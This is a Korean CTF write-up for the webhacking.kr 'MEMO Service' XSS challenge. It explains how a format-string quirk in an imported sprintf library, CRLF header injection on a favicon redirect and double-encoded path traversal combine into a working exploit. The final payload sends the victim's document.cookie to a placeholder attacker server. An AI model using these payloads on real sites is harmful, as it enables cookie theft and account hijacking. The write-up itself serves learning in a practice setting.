---
title: ["[Webhacking.kr] MEMO Service (xss - 350)"]
date: 2024-12-14 09:00:00 +0900
categories: [writeup, webhacking.kr]
tags: [web, xss]
---

```javascript
<script>
function saveMemo(){
  if(input.value){
    memo = getCookie('memo');
    if(!memo) memo = [];
    else memo = JSON.parse(atob(memo));
    memo.push(input.value);
    document.cookie = "memo="+btoa(JSON.stringify(memo));
    input.value="";
  }
  loadMemo();
}
function loadMemo(){
  memo = getCookie('memo');
  if(!memo) memo = [];
  else memo = JSON.parse(atob(memo));
  memoValue = "";
  for(i=0;i<memo.length;i++) memoValue = sprintf(memoValue + "<input disabled value='%s'></input><br>",memo[i].replaceAll("'","\""));
  box.innerHTML = memoValue;
}
function clearMemo(){
  memo = [];
  document.cookie = "memo="+btoa(JSON.stringify(memo));
  loadMemo();
}
function getCookie(name) {
  const value = "; "+document.cookie;
  const parts = value.split("; "+name+"=");
  if (parts.length === 2) return parts.pop().split(";").shift();
}
</script>
```

### 코드 분석
1. `saveMemo()`
  * 사용자가 입력한 메모를 저장하는 함수
  * 메모는 쿠키에 base64로 인코딩되어 저장
  * JSON 형태로 저장되며, 배열 구조를 사용
2. `loadMemo()`
  * 저장된 메모를 화면에 표시하는 함수
  * 쿠키에서 메모를 가져와서 base64 디코딩
  * 각 메모를 disabled input 태그로 화면에 출력
  * `sprintf()`를 사용해 메모 내용을 출력할 때 `'`를 `"`로 변환
3. `clearMemo()`
  * 모든 메모를 삭제하는 함수
4. `getCookie()`
  * 쿠키에서 특정 이름의 값을 가져오는 헬퍼 함수

### 시행착오
```html
<input disabled="" value="hello">
```  
메모로 입력한 값이 html 태그로 화면에 출력된다.  

```html
<input disabled="" value="&quot; onclick=alert(1)><script>alert(2)</script>">>
```
value의 `"`을 닫아보려고 했지만, html 엔티티로 인토딩되어 저장한다.

```javascript
for(i=0;i<memo.length;i++) memoValue = sprintf(memoValue + "<input disabled value='%s'></input><br>",memo[i].replaceAll("'","\""));
```
sprintf로 포맷팅할 때 `'`로 value를 감싸고 있다.  
single quote를 이스케이프 해야하지만, `replaceAll()`함수가 있어 쉽지 않아 보인다.  

여러 input을 테스트해보다 console에서 Uncaught TypeError가 나는 것을 식별했다.  
`sprintf.js`에서 나는 에러였는데, 소스코드를 다시 보니 `sprintf()` 함수가 네이티브 함수가 아니라 임포트된 것이었다.  

### Format String Injection

```javascript
var re = {
    // 포맷 지정자를 찾기 위한 정규식
    placeholder: /^\x25(?:([1-9]\d*)\$|\(([^)]+)\))?(\+)?(0|'[^$])?(-)?(\d+)?(?:\.(\d+))?([b-gijostTuvxX])/
    // ...
}

function sprintf_parse(fmt) {
    while (_fmt) {
        // 일반 텍스트 처리
        if ((match = re.text.exec(_fmt)) !== null) {
            parse_tree.push(match[0])
        }
        // 포맷 지정자 처리
        else if ((match = re.placeholder.exec(_fmt)) !== null) {
            parse_tree.push({
                placeholder: match[0],
                type: match[8],  // 포맷 타입(c, d, s 등)
                // ...
            })
        }
        _fmt = _fmt.substring(match[0].length)
    }
}
```
`sprintf()`는 format string 내부의 모든 포맷 지정자(`%d`, `%s`, `%c` 등)를 찾아서 처리한다.  
포맷 지정자가 문자열 중간에 있어도 인식하고, 발견된 각 포맷 지정자의 타입과 관련된 정보를 parse tree에 저장한다.  

```javascript
function sprintf_format(parse_tree, argv) {
    var cursor = 1
    for (i = 0; i < tree_length; i++) {
        if (typeof parse_tree[i] === 'string') {
            output += parse_tree[i]
        }
        else if (typeof parse_tree[i] === 'object') {
            // 다음 인자를 자동으로 선택
            arg = argv[cursor++]

            switch (ph.type) {
                case 'c':
                    arg = String.fromCharCode(parseInt(arg, 10))
                    break
                case 'd':
                    arg = parseInt(arg, 10)
                    break
                // ...
            }
        }
    }
}
```  
parse tree를 순회하면서 포맷 지정자를 만나면 자동으로 다음 인자를 사용한다.  

이러한 구현 방식 때문에 아래와 같은 동작이 가능하다.  

```javascript
// memo = ["%c><img src=1 onerror=alert(1)></img>","39"]
sprintf("<input value='%s'>",memo[0])
```
1. memo[0]이 `%s`의 인자로 들어감
2. memo[0] 안의 `%c`가 `sprintf_parse()`에 의해 포맷 지정자로 인식됨
3. `sprintf_format`이 `%c`를 처리할 때 자동으로 다음 문자열인 "39"를 사용
4. 39가 ASCII로 변환되어 value 속성을 이스케이프

cookie를 base64 인코딩해서 넣어주면 alert창이 성공적으로 뜬다.  

하지만, 이 접근방식은 쿠키를 수정해야되는데, report 페이지 봇의 쿠키를 어떻게 수정할 수 있을까?  
이전에도 자주 등장한 HTTP Header Injection을 사용하면 된다.  

### HTTP Header Injection
우리의 목표는 report 봇의 쿠키를 인젝션하고 메인페이지에 접속하도록 해야한다.  
burp로 메인페이지에서의 통신을 잡아보면, 클라이언트가 `favicon.ico`를 루트 경로에서 요청했지만, 실제 파일의 위치가 `/static/` 디렉토리에 있다.  
따라서, 서버는 클라이언트에게 새로운 위치로 리다이렉트하도록 `Location` 헤더를 지정해서 응답했다.  
브라우저는 이 응답을 받은 후, 자동으로 `Location` 헤더에 명시된 새 URL로 다시 요청을 보낸다.  

이런 리다이렉트 응답에 `Set-Cookie` 헤더를 인젝션한다면, repost 봇의 쿠키가 수정될 것이다.  

```
// Request
GET /favicon.ico%0d%0aSet-Cookie:memo=123123123 HTTP/1.1

// Response
Location: http://webhacking.kr:10013/static/favicon.ico
Set-Cookie:memo=123123123
```
HTTP Header Injection이 성공적으로 이루어졌다.  
이제 report 봇이 메인 페이지에 접속만 하면 된다.  

### URL Normalization Path Traversal
서버 설정에서 한 가지 흥미로운 점은 `/favicon.ico`로 시작하는 모든 요청을 매칭하여, 매칭된 요청에 대해 `/static`을 앞에 붙여서 리다이렉트 한다는 점이다.  
`/favicon.ico` 뒤에 어떤 문자열을 붙여도 서버는 이를 그대로 리다이렉트 해준다.  

이 점을 이용해서 path traversal을 일으킬 수 있다.  
```
// Request
GET /favicon.ico%2f..%252f..%252f HTTP/1.1

// Response
Location: http://webhacking.kr:10013/static/favicon.ico/..%2f..%2f
```
요청을 `..%252f..%252f`로 더블 인코딩해서 보내면, nginx 서버가 이를 한 번 디코딩해서 `..%2f..%2f`로 리다이렉트 응답을 해준다.  
브라우저는 인코딩 되어 있는 경로를 문자열로 인식하고 그대로 리다이렉션을 요청하며,  
nginx 서버는 이를 다시 디코딩 하여 최종적으로 `/static/favicon.ico/../../` 루트 경로에 접근이 가능하다.  

### 최종 페이로드
Format String Injection과 HTTP Header Injection, URL Normalization Path Traversal을 모두 사용하여 최종 페이로드를 구성할 수 있다.  

```
favicon.ico%2f..%252f..%252f%0d%0aSet-Cookie:memo={base64(["%c><img src=1 onerror=location.href='{SERVER.COM}?'+document.cookie></img>","39"])}
```